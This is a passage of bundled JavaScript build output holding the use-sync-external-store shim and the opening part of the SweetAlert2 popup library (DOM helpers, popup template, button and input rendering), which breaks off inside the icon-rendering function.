var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __require = /* @__PURE__ */ ((x) => typeof require !== "undefined" ? require : typeof Proxy !== "undefined" ? new Proxy(x, {
  get: (a, b) => (typeof require !== "undefined" ? require : a)[b]
}) : x)(function(x) {
  if (typeof require !== "undefined") return require.apply(this, arguments);
  throw Error('Dynamic require of "' + x + '" is not supported');
});
var __commonJS = (cb, mod) => function __require2() {
  return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
};
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));

// node_modules/use-sync-external-store/cjs/use-sync-external-store-shim.production.js
var require_use_sync_external_store_shim_production = __commonJS({
  "node_modules/use-sync-external-store/cjs/use-sync-external-store-shim.production.js"(exports) {
    "use strict";
    var React68 = __require("react");
    function is(x, y) {
      return x === y && (0 !== x || 1 / x === 1 / y) || x !== x && y !== y;
    }
    var objectIs = "function" === typeof Object.is ? Object.is : is;
    var useState42 = React68.useState;
    var useEffect35 = React68.useEffect;
    var useLayoutEffect7 = React68.useLayoutEffect;
    var useDebugValue = React68.useDebugValue;
    function useSyncExternalStore$2(subscribe, getSnapshot) {
      var value = getSnapshot(), _useState = useState42({ inst: { value, getSnapshot } }), inst = _useState[0].inst, forceUpdate = _useState[1];
      useLayoutEffect7(
        function() {
          inst.value = value;
          inst.getSnapshot = getSnapshot;
          checkIfSnapshotChanged(inst) && forceUpdate({ inst });
        },
        [subscribe, value, getSnapshot]
      );
      useEffect35(
        function() {
          checkIfSnapshotChanged(inst) && forceUpdate({ inst });
          return subscribe(function() {
            checkIfSnapshotChanged(inst) && forceUpdate({ inst });
          });
        },
        [subscribe]
      );
      useDebugValue(value);
      return value;
    }
    function checkIfSnapshotChanged(inst) {
      var latestGetSnapshot = inst.getSnapshot;
      inst = inst.value;
      try {
        var nextValue = latestGetSnapshot();
        return !objectIs(inst, nextValue);
      } catch (error) {
        return true;
      }
    }
    function useSyncExternalStore$1(subscribe, getSnapshot) {
      return getSnapshot();
    }
    var shim = "undefined" === typeof window || "undefined" === typeof window.document || "undefined" === typeof window.document.createElement ? useSyncExternalStore$1 : useSyncExternalStore$2;
    exports.useSyncExternalStore = void 0 !== React68.useSyncExternalStore ? React68.useSyncExternalStore : shim;
  }
});

// node_modules/use-sync-external-store/shim/index.js
var require_shim = __commonJS({
  "node_modules/use-sync-external-store/shim/index.js"(exports, module) {
    "use strict";
    if (true) {
      module.exports = require_use_sync_external_store_shim_production();
    } else {
      module.exports = null;
    }
  }
});

// node_modules/sweetalert2/dist/sweetalert2.all.js
var require_sweetalert2_all = __commonJS({
  "node_modules/sweetalert2/dist/sweetalert2.all.js"(exports, module) {
    (function(global, factory) {
      typeof exports === "object" && typeof module !== "undefined" ? module.exports = factory() : typeof define === "function" && define.amd ? define(factory) : (global = typeof globalThis !== "undefined" ? globalThis : global || self, global.Sweetalert2 = factory());
    })(exports, function() {
      "use strict";
      function _assertClassBrand(e, t, n) {
        if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n;
        throw new TypeError("Private element is not present on this object");
      }
      function _checkPrivateRedeclaration(e, t) {
        if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object");
      }
      function _classPrivateFieldGet2(s, a) {
        return s.get(_assertClassBrand(s, a));
      }
      function _classPrivateFieldInitSpec(e, t, a) {
        _checkPrivateRedeclaration(e, t), t.set(e, a);
      }
      function _classPrivateFieldSet2(s, a, r2) {
        return s.set(_assertClassBrand(s, a), r2), r2;
      }
      const RESTORE_FOCUS_TIMEOUT = 100;
      const globalState = {};
      const focusPreviousActiveElement = () => {
        if (globalState.previousActiveElement instanceof HTMLElement) {
          globalState.previousActiveElement.focus();
          globalState.previousActiveElement = null;
        } else if (document.body) {
          document.body.focus();
        }
      };
      const restoreActiveElement = (returnFocus) => {
        return new Promise((resolve) => {
          if (!returnFocus) {
            return resolve();
          }
          const x = window.scrollX;
          const y = window.scrollY;
          globalState.restoreFocusTimeout = setTimeout(() => {
            focusPreviousActiveElement();
            resolve();
          }, RESTORE_FOCUS_TIMEOUT);
          window.scrollTo(x, y);
        });
      };
      const swalPrefix = "swal2-";
      const classNames = ["container", "shown", "height-auto", "iosfix", "popup", "modal", "no-backdrop", "no-transition", "toast", "toast-shown", "show", "hide", "close", "title", "html-container", "actions", "confirm", "deny", "cancel", "footer", "icon", "icon-content", "image", "input", "file", "range", "select", "radio", "checkbox", "label", "textarea", "inputerror", "input-label", "validation-message", "progress-steps", "active-progress-step", "progress-step", "progress-step-line", "loader", "loading", "styled", "top", "top-start", "top-end", "top-left", "top-right", "center", "center-start", "center-end", "center-left", "center-right", "bottom", "bottom-start", "bottom-end", "bottom-left", "bottom-right", "grow-row", "grow-column", "grow-fullscreen", "rtl", "timer-progress-bar", "timer-progress-bar-container", "scrollbar-measure", "icon-success", "icon-warning", "icon-info", "icon-question", "icon-error", "draggable", "dragging"];
      const swalClasses = classNames.reduce(
        (acc, className) => {
          acc[className] = swalPrefix + className;
          return acc;
        },
        /** @type {SwalClasses} */
        {}
      );
      const icons = ["success", "warning", "info", "question", "error"];
      const iconTypes = icons.reduce(
        (acc, icon) => {
          acc[icon] = swalPrefix + icon;
          return acc;
        },
        /** @type {SwalIcons} */
        {}
      );
      const consolePrefix = "SweetAlert2:";
      const capitalizeFirstLetter = (str) => str.charAt(0).toUpperCase() + str.slice(1);
      const warn = (message2) => {
        console.warn(`${consolePrefix} ${typeof message2 === "object" ? message2.join(" ") : message2}`);
      };
      const error = (message2) => {
        console.error(`${consolePrefix} ${message2}`);
      };
      const previousWarnOnceMessages = [];
      const warnOnce = (message2) => {
        if (!previousWarnOnceMessages.includes(message2)) {
          previousWarnOnceMessages.push(message2);
          warn(message2);
        }
      };
      const warnAboutDeprecation = (deprecatedParam, useInstead = null) => {
        warnOnce(`"${deprecatedParam}" is deprecated and will be removed in the next major release.${useInstead ? ` Use "${useInstead}" instead.` : ""}`);
      };
      const callIfFunction = (arg) => typeof arg === "function" ? arg() : arg;
      const hasToPromiseFn = (arg) => arg && typeof arg.toPromise === "function";
      const asPromise = (arg) => hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg);
      const isPromise = (arg) => arg && Promise.resolve(arg) === arg;
      const getContainer = () => document.body.querySelector(`.${swalClasses.container}`);
      const elementBySelector = (selectorString) => {
        const container = getContainer();
        return container ? container.querySelector(selectorString) : null;
      };
      const elementByClass = (className) => {
        return elementBySelector(`.${className}`);
      };
      const getPopup = () => elementByClass(swalClasses.popup);
      const getIcon = () => elementByClass(swalClasses.icon);
      const getIconContent = () => elementByClass(swalClasses["icon-content"]);
      const getTitle = () => elementByClass(swalClasses.title);
      const getHtmlContainer = () => elementByClass(swalClasses["html-container"]);
      const getImage = () => elementByClass(swalClasses.image);
      const getProgressSteps = () => elementByClass(swalClasses["progress-steps"]);
      const getValidationMessage = () => elementByClass(swalClasses["validation-message"]);
      const getConfirmButton = () => (
        /** @type {HTMLButtonElement} */
        elementBySelector(`.${swalClasses.actions} .${swalClasses.confirm}`)
      );
      const getCancelButton = () => (
        /** @type {HTMLButtonElement} */
        elementBySelector(`.${swalClasses.actions} .${swalClasses.cancel}`)
      );
      const getDenyButton = () => (
        /** @type {HTMLButtonElement} */
        elementBySelector(`.${swalClasses.actions} .${swalClasses.deny}`)
      );
      const getInputLabel = () => elementByClass(swalClasses["input-label"]);
      const getLoader = () => elementBySelector(`.${swalClasses.loader}`);
      const getActions = () => elementByClass(swalClasses.actions);
      const getFooter = () => elementByClass(swalClasses.footer);
      const getTimerProgressBar = () => elementByClass(swalClasses["timer-progress-bar"]);
      const getCloseButton = () => elementByClass(swalClasses.close);
      const focusable = `
  a[href],
  area[href],
  input:not([disabled]),
  select:not([disabled]),
  textarea:not([disabled]),
  button:not([disabled]),
  iframe,
  object,
  embed,
  [tabindex="0"],
  [contenteditable],
  audio[controls],
  video[controls],
  summary
`;
      const getFocusableElements = () => {
        const popup = getPopup();
        if (!popup) {
          return [];
        }
        const focusableElementsWithTabindex = popup.querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])');
        const focusableElementsWithTabindexSorted = Array.from(focusableElementsWithTabindex).sort((a, b) => {
          const tabindexA = parseInt(a.getAttribute("tabindex") || "0");
          const tabindexB = parseInt(b.getAttribute("tabindex") || "0");
          if (tabindexA > tabindexB) {
            return 1;
          } else if (tabindexA < tabindexB) {
            return -1;
          }
          return 0;
        });
        const otherFocusableElements = popup.querySelectorAll(focusable);
        const otherFocusableElementsFiltered = Array.from(otherFocusableElements).filter((el) => el.getAttribute("tabindex") !== "-1");
        return [...new Set(focusableElementsWithTabindexSorted.concat(otherFocusableElementsFiltered))].filter((el) => isVisible$1(el));
      };
      const isModal = () => {
        return hasClass(document.body, swalClasses.shown) && !hasClass(document.body, swalClasses["toast-shown"]) && !hasClass(document.body, swalClasses["no-backdrop"]);
      };
      const isToast = () => {
        const popup = getPopup();
        if (!popup) {
          return false;
        }
        return hasClass(popup, swalClasses.toast);
      };
      const isLoading = () => {
        const popup = getPopup();
        if (!popup) {
          return false;
        }
        return popup.hasAttribute("data-loading");
      };
      const setInnerHtml = (elem, html) => {
        elem.textContent = "";
        if (html) {
          const parser = new DOMParser();
          const parsed = parser.parseFromString(html, `text/html`);
          const head = parsed.querySelector("head");
          if (head) {
            Array.from(head.childNodes).forEach((child) => {
              elem.appendChild(child);
            });
          }
          const body = parsed.querySelector("body");
          if (body) {
            Array.from(body.childNodes).forEach((child) => {
              if (child instanceof HTMLVideoElement || child instanceof HTMLAudioElement) {
                elem.appendChild(child.cloneNode(true));
              } else {
                elem.appendChild(child);
              }
            });
          }
        }
      };
      const hasClass = (elem, className) => {
        if (!className) {
          return false;
        }
        const classList = className.split(/\s+/);
        for (let i = 0; i < classList.length; i++) {
          if (!elem.classList.contains(classList[i])) {
            return false;
          }
        }
        return true;
      };
      const removeCustomClasses = (elem, params) => {
        Array.from(elem.classList).forEach((className) => {
          if (!Object.values(swalClasses).includes(className) && !Object.values(iconTypes).includes(className) && !Object.values(params.showClass || {}).includes(className)) {
            elem.classList.remove(className);
          }
        });
      };
      const applyCustomClass = (elem, params, className) => {
        removeCustomClasses(elem, params);
        if (!params.customClass) {
          return;
        }
        const customClass = params.customClass[
          /** @type {keyof SweetAlertCustomClass} */
          className
        ];
        if (!customClass) {
          return;
        }
        if (typeof customClass !== "string" && !customClass.forEach) {
          warn(`Invalid type of customClass.${className}! Expected string or iterable object, got "${typeof customClass}"`);
          return;
        }
        addClass(elem, customClass);
      };
      const getInput$1 = (popup, inputClass) => {
        if (!inputClass) {
          return null;
        }
        switch (inputClass) {
          case "select":
          case "textarea":
          case "file":
            return popup.querySelector(`.${swalClasses.popup} > .${swalClasses[inputClass]}`);
          case "checkbox":
            return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.checkbox} input`);
          case "radio":
            return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:checked`) || popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:first-child`);
          case "range":
            return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.range} input`);
          default:
            return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.input}`);
        }
      };
      const focusInput = (input) => {
        input.focus();
        if (input.type !== "file") {
          const val = input.value;
          input.value = "";
          input.value = val;
        }
      };
      const toggleClass = (target, classList, condition) => {
        if (!target || !classList) {
          return;
        }
        if (typeof classList === "string") {
          classList = classList.split(/\s+/).filter(Boolean);
        }
        classList.forEach((className) => {
          if (Array.isArray(target)) {
            target.forEach((elem) => {
              if (condition) {
                elem.classList.add(className);
              } else {
                elem.classList.remove(className);
              }
            });
          } else {
            if (condition) {
              target.classList.add(className);
            } else {
              target.classList.remove(className);
            }
          }
        });
      };
      const addClass = (target, classList) => {
        toggleClass(target, classList, true);
      };
      const removeClass = (target, classList) => {
        toggleClass(target, classList, false);
      };
      const getDirectChildByClass = (elem, className) => {
        const children = Array.from(elem.children);
        for (let i = 0; i < children.length; i++) {
          const child = children[i];
          if (child instanceof HTMLElement && hasClass(child, className)) {
            return child;
          }
        }
      };
      const applyNumericalStyle = (elem, property, value) => {
        if (value === `${parseInt(value)}`) {
          value = parseInt(value);
        }
        if (value || parseInt(value) === 0) {
          elem.style.setProperty(property, typeof value === "number" ? `${value}px` : value);
        } else {
          elem.style.removeProperty(property);
        }
      };
      const show = (elem, display = "flex") => {
        if (!elem) {
          return;
        }
        elem.style.display = display;
      };
      const hide4 = (elem) => {
        if (!elem) {
          return;
        }
        elem.style.display = "none";
      };
      const showWhenInnerHtmlPresent = (elem, display = "block") => {
        if (!elem) {
          return;
        }
        new MutationObserver(() => {
          toggle(elem, elem.innerHTML, display);
        }).observe(elem, {
          childList: true,
          subtree: true
        });
      };
      const setStyle = (parent, selector, property, value) => {
        const el = parent.querySelector(selector);
        if (el) {
          el.style.setProperty(property, value);
        }
      };
      const toggle = (elem, condition, display = "flex") => {
        if (condition) {
          show(elem, display);
        } else {
          hide4(elem);
        }
      };
      const isVisible$1 = (elem) => !!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
      const allButtonsAreHidden = () => !isVisible$1(getConfirmButton()) && !isVisible$1(getDenyButton()) && !isVisible$1(getCancelButton());
      const isScrollable = (elem) => !!(elem.scrollHeight > elem.clientHeight);
      const selfOrParentIsScrollable = (element, stopElement) => {
        let parent = element;
        while (parent && parent !== stopElement) {
          if (isScrollable(parent)) {
            return true;
          }
          parent = parent.parentElement;
        }
        return false;
      };
      const hasCssAnimation = (elem) => {
        const style = window.getComputedStyle(elem);
        const animDuration = parseFloat(style.getPropertyValue("animation-duration") || "0");
        const transDuration = parseFloat(style.getPropertyValue("transition-duration") || "0");
        return animDuration > 0 || transDuration > 0;
      };
      const animateTimerProgressBar = (timer, reset = false) => {
        const timerProgressBar = getTimerProgressBar();
        if (!timerProgressBar) {
          return;
        }
        if (isVisible$1(timerProgressBar)) {
          if (reset) {
            timerProgressBar.style.transition = "none";
            timerProgressBar.style.width = "100%";
          }
          setTimeout(() => {
            timerProgressBar.style.transition = `width ${timer / 1e3}s linear`;
            timerProgressBar.style.width = "0%";
          }, 10);
        }
      };
      const stopTimerProgressBar = () => {
        const timerProgressBar = getTimerProgressBar();
        if (!timerProgressBar) {
          return;
        }
        const timerProgressBarWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
        timerProgressBar.style.removeProperty("transition");
        timerProgressBar.style.width = "100%";
        const timerProgressBarFullWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
        const timerProgressBarPercent = timerProgressBarWidth / timerProgressBarFullWidth * 100;
        timerProgressBar.style.width = `${timerProgressBarPercent}%`;
      };
      const isNodeEnv = () => typeof window === "undefined" || typeof document === "undefined";
      const sweetHTML = `
 <div aria-labelledby="${swalClasses.title}" aria-describedby="${swalClasses["html-container"]}" class="${swalClasses.popup}" tabindex="-1">
   <button type="button" class="${swalClasses.close}"></button>
   <ul class="${swalClasses["progress-steps"]}"></ul>
   <div class="${swalClasses.icon}"></div>
   <img class="${swalClasses.image}" />
   <h2 class="${swalClasses.title}" id="${swalClasses.title}"></h2>
   <div class="${swalClasses["html-container"]}" id="${swalClasses["html-container"]}"></div>
   <input class="${swalClasses.input}" id="${swalClasses.input}" />
   <input type="file" class="${swalClasses.file}" />
   <div class="${swalClasses.range}">
     <input type="range" />
     <output></output>
   </div>
   <select class="${swalClasses.select}" id="${swalClasses.select}"></select>
   <div class="${swalClasses.radio}"></div>
   <label class="${swalClasses.checkbox}">
     <input type="checkbox" id="${swalClasses.checkbox}" />
     <span class="${swalClasses.label}"></span>
   </label>
   <textarea class="${swalClasses.textarea}" id="${swalClasses.textarea}"></textarea>
   <div class="${swalClasses["validation-message"]}" id="${swalClasses["validation-message"]}"></div>
   <div class="${swalClasses.actions}">
     <div class="${swalClasses.loader}"></div>
     <button type="button" class="${swalClasses.confirm}"></button>
     <button type="button" class="${swalClasses.deny}"></button>
     <button type="button" class="${swalClasses.cancel}"></button>
   </div>
   <div class="${swalClasses.footer}"></div>
   <div class="${swalClasses["timer-progress-bar-container"]}">
     <div class="${swalClasses["timer-progress-bar"]}"></div>
   </div>
 </div>
`.replace(/(^|\n)\s*/g, "");
      const resetOldContainer = () => {
        const oldContainer = getContainer();
        if (!oldContainer) {
          return false;
        }
        oldContainer.remove();
        removeClass([document.documentElement, document.body], [swalClasses["no-backdrop"], swalClasses["toast-shown"], swalClasses["has-column"]]);
        return true;
      };
      const resetValidationMessage$1 = () => {
        globalState.currentInstance.resetValidationMessage();
      };
      const addInputChangeListeners = () => {
        const popup = getPopup();
        const input = getDirectChildByClass(popup, swalClasses.input);
        const file = getDirectChildByClass(popup, swalClasses.file);
        const range = popup.querySelector(`.${swalClasses.range} input`);
        const rangeOutput = popup.querySelector(`.${swalClasses.range} output`);
        const select = getDirectChildByClass(popup, swalClasses.select);
        const checkbox = popup.querySelector(`.${swalClasses.checkbox} input`);
        const textarea = getDirectChildByClass(popup, swalClasses.textarea);
        input.oninput = resetValidationMessage$1;
        file.onchange = resetValidationMessage$1;
        select.onchange = resetValidationMessage$1;
        checkbox.onchange = resetValidationMessage$1;
        textarea.oninput = resetValidationMessage$1;
        range.oninput = () => {
          resetValidationMessage$1();
          rangeOutput.value = range.value;
        };
        range.onchange = () => {
          resetValidationMessage$1();
          rangeOutput.value = range.value;
        };
      };
      const getTarget = (target) => typeof target === "string" ? document.querySelector(target) : target;
      const setupAccessibility = (params) => {
        const popup = getPopup();
        popup.setAttribute("role", params.toast ? "alert" : "dialog");
        popup.setAttribute("aria-live", params.toast ? "polite" : "assertive");
        if (!params.toast) {
          popup.setAttribute("aria-modal", "true");
        }
      };
      const setupRTL = (targetElement) => {
        if (window.getComputedStyle(targetElement).direction === "rtl") {
          addClass(getContainer(), swalClasses.rtl);
        }
      };
      const init = (params) => {
        const oldContainerExisted = resetOldContainer();
        if (isNodeEnv()) {
          error("SweetAlert2 requires document to initialize");
          return;
        }
        const container = document.createElement("div");
        container.className = swalClasses.container;
        if (oldContainerExisted) {
          addClass(container, swalClasses["no-transition"]);
        }
        setInnerHtml(container, sweetHTML);
        container.dataset["swal2Theme"] = params.theme;
        const targetElement = getTarget(params.target);
        targetElement.appendChild(container);
        if (params.topLayer) {
          container.setAttribute("popover", "");
          container.showPopover();
        }
        setupAccessibility(params);
        setupRTL(targetElement);
        addInputChangeListeners();
      };
      const parseHtmlToContainer = (param, target) => {
        if (param instanceof HTMLElement) {
          target.appendChild(param);
        } else if (typeof param === "object") {
          handleObject(param, target);
        } else if (param) {
          setInnerHtml(target, param);
        }
      };
      const handleObject = (param, target) => {
        if (param.jquery) {
          handleJqueryElem(target, param);
        } else {
          setInnerHtml(target, param.toString());
        }
      };
      const handleJqueryElem = (target, elem) => {
        target.textContent = "";
        if (0 in elem) {
          for (let i = 0; i in elem; i++) {
            target.appendChild(elem[i].cloneNode(true));
          }
        } else {
          target.appendChild(elem.cloneNode(true));
        }
      };
      const renderActions = (instance, params) => {
        const actions = getActions();
        const loader = getLoader();
        if (!actions || !loader) {
          return;
        }
        if (!params.showConfirmButton && !params.showDenyButton && !params.showCancelButton) {
          hide4(actions);
        } else {
          show(actions);
        }
        applyCustomClass(actions, params, "actions");
        renderButtons(actions, loader, params);
        setInnerHtml(loader, params.loaderHtml || "");
        applyCustomClass(loader, params, "loader");
      };
      function renderButtons(actions, loader, params) {
        const confirmButton = getConfirmButton();
        const denyButton = getDenyButton();
        const cancelButton = getCancelButton();
        if (!confirmButton || !denyButton || !cancelButton) {
          return;
        }
        renderButton(confirmButton, "confirm", params);
        renderButton(denyButton, "deny", params);
        renderButton(cancelButton, "cancel", params);
        handleButtonsStyling(confirmButton, denyButton, cancelButton, params);
        if (params.reverseButtons) {
          if (params.toast) {
            actions.insertBefore(cancelButton, confirmButton);
            actions.insertBefore(denyButton, confirmButton);
          } else {
            actions.insertBefore(cancelButton, loader);
            actions.insertBefore(denyButton, loader);
            actions.insertBefore(confirmButton, loader);
          }
        }
      }
      function handleButtonsStyling(confirmButton, denyButton, cancelButton, params) {
        if (!params.buttonsStyling) {
          removeClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
          return;
        }
        addClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
        if (params.confirmButtonColor) {
          confirmButton.style.setProperty("--swal2-confirm-button-background-color", params.confirmButtonColor);
        }
        if (params.denyButtonColor) {
          denyButton.style.setProperty("--swal2-deny-button-background-color", params.denyButtonColor);
        }
        if (params.cancelButtonColor) {
          cancelButton.style.setProperty("--swal2-cancel-button-background-color", params.cancelButtonColor);
        }
        applyOutlineColor(confirmButton);
        applyOutlineColor(denyButton);
        applyOutlineColor(cancelButton);
      }
      function applyOutlineColor(button) {
        const buttonStyle = window.getComputedStyle(button);
        if (buttonStyle.getPropertyValue("--swal2-action-button-focus-box-shadow")) {
          return;
        }
        const outlineColor = buttonStyle.backgroundColor.replace(/rgba?\((\d+), (\d+), (\d+).*/, "rgba($1, $2, $3, 0.5)");
        button.style.setProperty("--swal2-action-button-focus-box-shadow", buttonStyle.getPropertyValue("--swal2-outline").replace(/ rgba\(.*/, ` ${outlineColor}`));
      }
      function renderButton(button, buttonType, params) {
        const buttonName = (
          /** @type {'Confirm' | 'Deny' | 'Cancel'} */
          capitalizeFirstLetter(buttonType)
        );
        toggle(button, params[`show${buttonName}Button`], "inline-block");
        setInnerHtml(button, params[`${buttonType}ButtonText`] || "");
        button.setAttribute("aria-label", params[`${buttonType}ButtonAriaLabel`] || "");
        button.className = swalClasses[buttonType];
        applyCustomClass(button, params, `${buttonType}Button`);
      }
      const renderCloseButton = (instance, params) => {
        const closeButton = getCloseButton();
        if (!closeButton) {
          return;
        }
        setInnerHtml(closeButton, params.closeButtonHtml || "");
        applyCustomClass(closeButton, params, "closeButton");
        toggle(closeButton, params.showCloseButton);
        closeButton.setAttribute("aria-label", params.closeButtonAriaLabel || "");
      };
      const renderContainer = (instance, params) => {
        const container = getContainer();
        if (!container) {
          return;
        }
        handleBackdropParam(container, params.backdrop);
        handlePositionParam(container, params.position);
        handleGrowParam(container, params.grow);
        applyCustomClass(container, params, "container");
      };
      function handleBackdropParam(container, backdrop) {
        if (typeof backdrop === "string") {
          container.style.background = backdrop;
        } else if (!backdrop) {
          addClass([document.documentElement, document.body], swalClasses["no-backdrop"]);
        }
      }
      function handlePositionParam(container, position) {
        if (!position) {
          return;
        }
        if (position in swalClasses) {
          addClass(container, swalClasses[position]);
        } else {
          warn('The "position" parameter is not valid, defaulting to "center"');
          addClass(container, swalClasses.center);
        }
      }
      function handleGrowParam(container, grow) {
        if (!grow) {
          return;
        }
        addClass(container, swalClasses[`grow-${grow}`]);
      }
      var privateProps = {
        innerParams: /* @__PURE__ */ new WeakMap(),
        domCache: /* @__PURE__ */ new WeakMap()
      };
      const inputClasses = ["input", "file", "range", "select", "radio", "checkbox", "textarea"];
      const renderInput = (instance, params) => {
        const popup = getPopup();
        if (!popup) {
          return;
        }
        const innerParams = privateProps.innerParams.get(instance);
        const rerender = !innerParams || params.input !== innerParams.input;
        inputClasses.forEach((inputClass) => {
          const inputContainer = getDirectChildByClass(popup, swalClasses[inputClass]);
          if (!inputContainer) {
            return;
          }
          setAttributes(inputClass, params.inputAttributes);
          inputContainer.className = swalClasses[inputClass];
          if (rerender) {
            hide4(inputContainer);
          }
        });
        if (params.input) {
          if (rerender) {
            showInput(params);
          }
          setCustomClass(params);
        }
      };
      const showInput = (params) => {
        if (!params.input) {
          return;
        }
        if (!renderInputType[params.input]) {
          error(`Unexpected type of input! Expected ${Object.keys(renderInputType).join(" | ")}, got "${params.input}"`);
          return;
        }
        const inputContainer = getInputContainer(params.input);
        if (!inputContainer) {
          return;
        }
        const input = renderInputType[params.input](inputContainer, params);
        show(inputContainer);
        if (params.inputAutoFocus) {
          setTimeout(() => {
            focusInput(input);
          });
        }
      };
      const removeAttributes = (input) => {
        for (let i = 0; i < input.attributes.length; i++) {
          const attrName = input.attributes[i].name;
          if (!["id", "type", "value", "style"].includes(attrName)) {
            input.removeAttribute(attrName);
          }
        }
      };
      const setAttributes = (inputClass, inputAttributes) => {
        const popup = getPopup();
        if (!popup) {
          return;
        }
        const input = getInput$1(popup, inputClass);
        if (!input) {
          return;
        }
        removeAttributes(input);
        for (const attr in inputAttributes) {
          input.setAttribute(attr, inputAttributes[attr]);
        }
      };
      const setCustomClass = (params) => {
        if (!params.input) {
          return;
        }
        const inputContainer = getInputContainer(params.input);
        if (inputContainer) {
          applyCustomClass(inputContainer, params, "input");
        }
      };
      const setInputPlaceholder = (input, params) => {
        if (!input.placeholder && params.inputPlaceholder) {
          input.placeholder = params.inputPlaceholder;
        }
      };
      const setInputLabel = (input, prependTo, params) => {
        if (params.inputLabel) {
          const label = document.createElement("label");
          const labelClass = swalClasses["input-label"];
          label.setAttribute("for", input.id);
          label.className = labelClass;
          if (typeof params.customClass === "object") {
            addClass(label, params.customClass.inputLabel);
          }
          label.innerText = params.inputLabel;
          prependTo.insertAdjacentElement("beforebegin", label);
        }
      };
      const getInputContainer = (inputType) => {
        const popup = getPopup();
        if (!popup) {
          return;
        }
        return getDirectChildByClass(popup, swalClasses[
          /** @type {SwalClass} */
          inputType
        ] || swalClasses.input);
      };
      const checkAndSetInputValue = (input, inputValue) => {
        if (["string", "number"].includes(typeof inputValue)) {
          input.value = `${inputValue}`;
        } else if (!isPromise(inputValue)) {
          warn(`Unexpected type of inputValue! Expected "string", "number" or "Promise", got "${typeof inputValue}"`);
        }
      };
      const renderInputType = {};
      renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = renderInputType.search = renderInputType.date = renderInputType["datetime-local"] = renderInputType.time = renderInputType.week = renderInputType.month = /** @type {(input: Input | HTMLElement, params: SweetAlertOptions) => Input} */
      (input, params) => {
        checkAndSetInputValue(input, params.inputValue);
        setInputLabel(input, input, params);
        setInputPlaceholder(input, params);
        input.type = params.input;
        return input;
      };
      renderInputType.file = (input, params) => {
        setInputLabel(input, input, params);
        setInputPlaceholder(input, params);
        return input;
      };
      renderInputType.range = (range, params) => {
        const rangeInput = range.querySelector("input");
        const rangeOutput = range.querySelector("output");
        checkAndSetInputValue(rangeInput, params.inputValue);
        rangeInput.type = params.input;
        checkAndSetInputValue(rangeOutput, params.inputValue);
        setInputLabel(rangeInput, range, params);
        return range;
      };
      renderInputType.select = (select, params) => {
        select.textContent = "";
        if (params.inputPlaceholder) {
          const placeholder = document.createElement("option");
          setInnerHtml(placeholder, params.inputPlaceholder);
          placeholder.value = "";
          placeholder.disabled = true;
          placeholder.selected = true;
          select.appendChild(placeholder);
        }
        setInputLabel(select, select, params);
        return select;
      };
      renderInputType.radio = (radio) => {
        radio.textContent = "";
        return radio;
      };
      renderInputType.checkbox = (checkboxContainer, params) => {
        const checkbox = getInput$1(getPopup(), "checkbox");
        checkbox.value = "1";
        checkbox.checked = Boolean(params.inputValue);
        const label = checkboxContainer.querySelector("span");
        setInnerHtml(label, params.inputPlaceholder || params.inputLabel);
        return checkbox;
      };
      renderInputType.textarea = (textarea, params) => {
        checkAndSetInputValue(textarea, params.inputValue);
        setInputPlaceholder(textarea, params);
        setInputLabel(textarea, textarea, params);
        const getMargin = (el) => parseInt(window.getComputedStyle(el).marginLeft) + parseInt(window.getComputedStyle(el).marginRight);
        setTimeout(() => {
          if ("MutationObserver" in window) {
            const initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);
            const textareaResizeHandler = () => {
              if (!document.body.contains(textarea)) {
                return;
              }
              const textareaWidth = textarea.offsetWidth + getMargin(textarea);
              if (textareaWidth > initialPopupWidth) {
                getPopup().style.width = `${textareaWidth}px`;
              } else {
                applyNumericalStyle(getPopup(), "width", params.width);
              }
            };
            new MutationObserver(textareaResizeHandler).observe(textarea, {
              attributes: true,
              attributeFilter: ["style"]
            });
          }
        });
        return textarea;
      };
      const renderContent = (instance, params) => {
        const htmlContainer = getHtmlContainer();
        if (!htmlContainer) {
          return;
        }
        showWhenInnerHtmlPresent(htmlContainer);
        applyCustomClass(htmlContainer, params, "htmlContainer");
        if (params.html) {
          parseHtmlToContainer(params.html, htmlContainer);
          show(htmlContainer, "block");
        } else if (params.text) {
          htmlContainer.textContent = params.text;
          show(htmlContainer, "block");
        } else {
          hide4(htmlContainer);
        }
        renderInput(instance, params);
      };
      const renderFooter = (instance, params) => {
        const footer = getFooter();
        if (!footer) {
          return;
        }
        showWhenInnerHtmlPresent(footer);
        toggle(footer, params.footer, "block");
        if (params.footer) {
          parseHtmlToContainer(params.footer, footer);
        }
        applyCustomClass(footer, params, "footer");
      };
      const renderIcon = (instance, params) => {
        const innerParams = privateProps.innerParams.get(instance);
        const icon = getIcon();
        if (!icon) {
          return;
        }
